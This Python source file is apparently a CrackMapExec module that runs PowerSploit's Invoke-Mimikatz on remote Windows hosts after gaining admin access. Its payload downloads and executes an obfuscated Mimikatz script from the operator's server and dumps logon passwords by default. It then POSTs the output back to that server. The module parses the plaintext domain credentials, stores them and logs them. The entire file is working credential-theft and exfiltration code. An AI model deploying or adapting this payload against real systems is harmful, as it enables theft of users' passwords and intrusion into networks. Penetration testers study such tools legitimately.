from core.helpers import create_ps_command, obfs_ps_script, gen_random_string
from datetime import datetime
from StringIO import StringIO

class CMEModule:
    '''
        Executes PowerSploit's Invoke-Mimikatz.ps1 script
        Module by @byt3bl33d3r
    '''

    name = 'Mimikatz'

    def options(self, context, module_options):
        '''
           COMMAND Mimikatz command to execute
        '''

        self.mimikatz_command = 'privilege::debug sekurlsa::logonpasswords exit'

        if module_options and 'COMMAND' in module_options:
            self.mimikatz_command = module_options['COMMAND']

        #context.log.debug("Mimikatz command: '{}'".format(self.mimikatz_command))

        self.obfs_name = gen_random_string()

    def on_admin_login(self, context, connection):

        payload = '''
        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-Mimikatz.ps1');
        $creds = Invoke-{func_name} -Command '{command}';
        $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
        $request.Method = 'POST';
        $request.ContentType = 'application/x-www-form-urlencoded';
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);
        $request.ContentLength = $bytes.Length;
        $requestStream = $request.GetRequestStream();
        $requestStream.Write( $bytes, 0, $bytes.Length );
        $requestStream.Close();
        $request.GetResponse();'''.format(server=context.server, 
                                          port=context.server_port, 
                                          addr=context.localip,
                                          func_name=self.obfs_name,
                                          command=self.mimikatz_command)

        context.log.debug('Payload: {}'.format(payload))
        payload = create_ps_command(payload)
        connection.execute(payload)
        context.log.success('Executed payload')

    def on_request(self, context, request):
        if 'Invoke-Mimikatz.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            with open('data/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1', 'r') as ps_script:
                ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
                request.wfile.write(ps_script)

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = response.rfile.read(length)

        #We've received the response, stop tracking this host
        response.stop_tracking_host()

        #No reason to parse for passwords if we didn't run the default command
        if 'sekurlsa::logonpasswords' in self.mimikatz_command:
            buf = StringIO(data).readlines()
            plaintext_creds = []

            i = 0
            while i < len(buf):
                if ('Password' in buf[i]) and ('(null)' not in buf[i]):
                    passw  = buf[i].split(':')[1].strip()
                    domain = buf[i-1].split(':')[1].strip().upper()
                    user   = buf[i-2].split(':')[1].strip().lower()

                    #Dont parse machine accounts
                    if not user[-1:] == '$':
                        context.db.add_credential('plaintext', domain, user, passw)
                        plaintext_creds.append('{}\\{}:{}'.format(domain, user, passw))

                i += 1

            if plaintext_creds:
                context.log.success('Found plain text credentials (domain\\user:password)')
                for cred in plaintext_creds:
                    context.log.highlight(cred)

        log_name = 'Mimikatz-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
        with open('logs/' + log_name, 'w') as mimikatz_output:
            mimikatz_output.write(data)
        context.log.info("Saved Mimikatz's output to {}".format(log_name))